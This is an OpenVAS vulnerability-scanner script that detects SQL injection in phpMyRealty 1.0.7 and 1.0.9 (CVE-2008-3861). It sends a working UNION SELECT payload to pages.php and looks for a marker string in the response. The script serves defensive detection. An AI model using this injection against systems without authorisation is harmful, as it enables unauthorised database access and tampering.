###############################################################################
# OpenVAS Vulnerability Test
# $Id: phpMyRealty_1_0_9_sql_injection.nasl 15 2013-10-27 12:49:54Z jan $
#
# phpMyRealty Multiple SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "phpMyRealty is prone to multiple SQL-injection vulnerabilities
  because it fails to sufficiently sanitize user-supplied data before
  using it in an SQL query.

  Exploiting these issues could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.

  These issues affect phpMyRealty 1.0.7 and 1.0.9; other versions may also be affected. 

 See Also:
  http://www.securityfocus.com/bid/30862";


if (description)
{
 script_id(100071);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-22 17:08:49 +0100 (Sun, 22 Mar 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2008-3861");
 script_bugtraq_id(30862);
 script_tag(name:"risk_factor", value:"High");

 desc = "

 Summary:
 " + tag_summary;

 script_name("phpMyRealty Multiple SQL Injection Vulnerabilities");
 script_description(desc);
 script_summary("Determine if phpMyRealty is prone to SQL Injectionting vulnerabilities");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

dir = make_list(cgi_dirs());

foreach d (dir)
{ 
 
 url = string(d, "/pages.php?id=-999999+union+select+0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3--");

 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
 if( buf == NULL )continue;

 if ( egrep(pattern:"OpenVAS-SQL-Injection-Test", string: buf, icase: true) )
 { 
     security_hole(port:port);
     exit(0);
 }
}
 
exit(0);
